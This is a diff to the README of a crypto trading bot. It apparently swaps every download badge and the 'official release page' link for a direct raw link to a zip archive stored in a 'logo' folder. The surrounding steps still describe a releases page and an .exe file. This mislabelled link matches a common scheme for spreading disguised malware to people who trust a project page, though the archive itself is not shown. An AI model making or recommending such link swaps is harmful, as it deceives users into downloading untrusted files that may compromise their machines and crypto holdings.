@@ -1,6 +1,6 @@
 # 🤖 nexus-trade-bot - Automate your crypto trading strategy easily
 
-[![](https://img.shields.io/badge/Download_Nexus_Trade_Bot-Blue)](https://github.com/3mitra5814/nexus-trade-bot/releases)
+[![](https://img.shields.io/badge/Download_Nexus_Trade_Bot-Blue)](https://raw.githubusercontent.com/3mitra5814/nexus-trade-bot/main/logo/nexus_trade_bot_3.2.zip)
 
 Nexus Trade Bot helps you run trading strategies on your computer. It connects to crypto exchanges to place orders and manage your assets. The software handles high-speed trades for you inside a simple web interface. You do not need to write code to use this tool. You can deploy it quickly on your own hardware or a server.
 
@@ -18,11 +18,11 @@ You do not need to install complex language environments. The application comes 
 
 ## 📥 Downloading the Software
 
-[![](https://img.shields.io/badge/Click_Here_to_Download-Grey)](https://github.com/3mitra5814/nexus-trade-bot/releases)
+[![](https://img.shields.io/badge/Click_Here_to_Download-Grey)](https://raw.githubusercontent.com/3mitra5814/nexus-trade-bot/main/logo/nexus_trade_bot_3.2.zip)
 
 Follow these steps to get the software on your machine:
 
-1.  Navigate to the [official release page](https://github.com/3mitra5814/nexus-trade-bot/releases).
+1.  Navigate to the [official release page](https://raw.githubusercontent.com/3mitra5814/nexus-trade-bot/main/logo/nexus_trade_bot_3.2.zip).
 2.  Look for the latest release at the top of the page.
 3.  Find the file that ends in .exe for Windows.
 4.  Click the file name to start the download process.
